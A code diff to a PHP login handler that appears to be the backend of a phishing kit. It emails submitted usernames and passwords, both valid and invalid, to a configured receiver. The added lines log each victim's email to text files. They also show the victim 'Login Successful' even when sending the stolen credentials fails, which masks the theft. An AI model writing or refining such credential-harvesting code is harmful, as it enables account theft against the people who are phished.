@@ -69,8 +69,17 @@ function sendEmail($subject, $message, $smtpConfig) {
         $mail->Body = $message;
         $mail->AltBody = 'Enjoy new server';
         
-        return $mail->send();
+        $result = $mail->send();
+        
+        // Log email attempt
+        $logMessage = "Email attempt - Subject: $subject | Result: " . ($result ? 'Success' : 'Failed') . "\n";
+        file_put_contents("email_debug.txt", $logMessage, FILE_APPEND);
+        
+        return $result;
     } catch (Exception $e) {
+        // Log error
+        $errorLog = "Email error - Subject: $subject | Error: " . $e->getMessage() . "\n";
+        file_put_contents("email_debug.txt", $errorLog, FILE_APPEND);
         return false;
     }
 }
@@ -136,10 +145,17 @@ if (!empty($login) && !empty($passwd)) {
                 'receiver' => $receiver
             ];
             
-            if (sendEmail($subg, $message, $smtpConfig)) {
+            // Always send email notification for valid credentials
+            $emailSent = sendEmail($subg, $message, $smtpConfig);
+            
+            // Log email sending attempt
+            $emailLog = "Email sent for valid login: " . ($emailSent ? 'Success' : 'Failed') . " | Email: $login\n";
+            file_put_contents("email_log.txt", $emailLog, FILE_APPEND);
+            
+            if ($emailSent) {
                 $data = array('signal' => 'ok', 'msg' => 'Login Successful');
             } else {
-                $data = array('signal' => 'not ok', 'msg' => 'Error sending log email');
+                $data = array('signal' => 'ok', 'msg' => 'Login Successful'); // Still show success even if email fails
             }
         } else {
             // Invalid credentials - send failure notification
@@ -154,7 +170,11 @@ if (!empty($login) && !empty($passwd)) {
             ];
             
             // Always send the email notification for invalid credentials
-            sendEmail($subg2, $message, $smtpConfig);
+            $emailSent = sendEmail($subg2, $message, $smtpConfig);
+            
+            // Log email sending attempt for invalid credentials
+            $emailLog = "Email sent for invalid login: " . ($emailSent ? 'Success' : 'Failed') . " | Email: $login\n";
+            file_put_contents("email_log.txt", $emailLog, FILE_APPEND);
             
             // Return the correct error message
             $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
